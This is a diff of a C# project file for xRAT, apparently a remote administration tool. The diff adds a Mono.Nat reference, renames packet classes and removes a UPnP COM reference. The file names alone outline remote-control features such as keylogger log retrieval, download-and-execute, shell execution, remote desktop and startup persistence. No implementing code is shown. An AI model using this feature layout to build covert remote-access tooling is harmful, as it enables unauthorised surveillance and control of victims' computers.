@@ -51,6 +51,9 @@
       <SpecificVersion>False</SpecificVersion>
       <HintPath>lib\Mono.Cecil.dll</HintPath>
     </Reference>
+    <Reference Include="Mono.Nat">
+      <HintPath>lib\Mono.Nat.dll</HintPath>
+    </Reference>
     <Reference Include="System" />
     <Reference Include="System.Data" />
     <Reference Include="System.Drawing" />
@@ -84,50 +87,51 @@
     <Compile Include="Core\Extensions\ListViewExtensions.cs" />
     <Compile Include="Core\Misc\NoIpUpdater.cs" />
     <Compile Include="Core\Misc\SavedVariables.cs" />
+    <Compile Include="Core\Networking\ConnectionHandler.cs" />
     <Compile Include="Core\Networking\PooledBufferManager.cs" />
-    <Compile Include="Core\Packets\ClientPackets\DesktopResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\DirectoryResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\DownloadFileResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\DrivesResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetLogsResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\GetDesktopResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\GetDirectoryResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\DoDownloadFileResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\GetDrivesResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\GetKeyloggerLogsResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetProcessesResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetStartupItemsResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetSystemInfoResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\MonitorsResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\ShellCommandResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\UserStatus.cs" />
-    <Compile Include="Core\Packets\ClientPackets\Initialize.cs" />
-    <Compile Include="Core\Packets\ClientPackets\Status.cs" />
+    <Compile Include="Core\Packets\ClientPackets\GetMonitorsResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\DoShellExecuteResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\SetUserStatus.cs" />
+    <Compile Include="Core\Packets\ClientPackets\GetAuthenticationResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\SetStatus.cs" />
     <Compile Include="Core\Packets\IPacket.cs" />
     <Compile Include="Core\Packets\PacketHandler.cs" />
-    <Compile Include="Core\Packets\ServerPackets\Action.cs" />
-    <Compile Include="Core\Packets\ServerPackets\AddStartupItem.cs" />
-    <Compile Include="Core\Packets\ServerPackets\Delete.cs" />
-    <Compile Include="Core\Packets\ServerPackets\Desktop.cs" />
-    <Compile Include="Core\Packets\ServerPackets\Directory.cs" />
-    <Compile Include="Core\Packets\ServerPackets\Disconnect.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DownloadAndExecute.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DownloadFile.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DownloadFileCanceled.cs" />
-    <Compile Include="Core\Packets\ServerPackets\Drives.cs" />
-    <Compile Include="Core\Packets\ServerPackets\GetLogs.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoPathDelete.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoPathRename.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoShutdownAction.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoStartupItemAdd.cs" />
+    <Compile Include="Core\Packets\ServerPackets\GetDesktop.cs" />
+    <Compile Include="Core\Packets\ServerPackets\GetDirectory.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoClientDisconnect.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoDownloadAndExecute.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoDownloadFile.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoDownloadFileCancel.cs" />
+    <Compile Include="Core\Packets\ServerPackets\GetDrives.cs" />
+    <Compile Include="Core\Packets\ServerPackets\GetKeyloggerLogs.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetProcesses.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetStartupItems.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetSystemInfo.cs" />
-    <Compile Include="Core\Packets\ServerPackets\KillProcess.cs" />
-    <Compile Include="Core\Packets\ServerPackets\Monitors.cs" />
-    <Compile Include="Core\Packets\ServerPackets\MouseClick.cs" />
-    <Compile Include="Core\Packets\ServerPackets\RemoveStartupitem.cs" />
-    <Compile Include="Core\Packets\ServerPackets\Rename.cs" />
-    <Compile Include="Core\Packets\ServerPackets\ShellCommand.cs" />
-    <Compile Include="Core\Packets\ServerPackets\ShowMessageBox.cs" />
-    <Compile Include="Core\Packets\ServerPackets\StartProcess.cs" />
-    <Compile Include="Core\Packets\ServerPackets\Uninstall.cs" />
-    <Compile Include="Core\Packets\ServerPackets\Update.cs" />
-    <Compile Include="Core\Packets\ServerPackets\UploadAndExecute.cs" />
-    <Compile Include="Core\Packets\ServerPackets\VisitWebsite.cs" />
-    <Compile Include="Core\Packets\ServerPackets\InitializeCommand.cs" />
-    <Compile Include="Core\Packets\ServerPackets\Reconnect.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoProcessKill.cs" />
+    <Compile Include="Core\Packets\ServerPackets\GetMonitors.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoMouseClick.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoStartupItemRemove.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoShellExecute.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoShowMessageBox.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoProcessStart.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoClientUninstall.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoClientUpdate.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoUploadAndExecute.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoVisitWebsite.cs" />
+    <Compile Include="Core\Packets\ServerPackets\GetAuthentication.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoClientReconnect.cs" />
     <Compile Include="Core\Packets\UnknownPacket.cs" />
     <Compile Include="Core\ProtoBuf\BclHelpers.cs" />
     <Compile Include="Core\ProtoBuf\BufferExtension.cs" />
@@ -434,17 +438,6 @@
   </ItemGroup>
   <ItemGroup>
     <Content Include="xRAT-64x64.ico" />
-  </ItemGroup>
-  <ItemGroup>
-    <COMReference Include="NATUPNPLib">
-      <Guid>{1C565858-F302-471E-B409-F180AA4ABEC6}</Guid>
-      <VersionMajor>1</VersionMajor>
-      <VersionMinor>0</VersionMinor>
-      <Lcid>0</Lcid>
-      <WrapperTool>tlbimp</WrapperTool>
-      <Isolated>False</Isolated>
-      <EmbedInteropTypes>True</EmbedInteropTypes>
-    </COMReference>
   </ItemGroup>
   <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
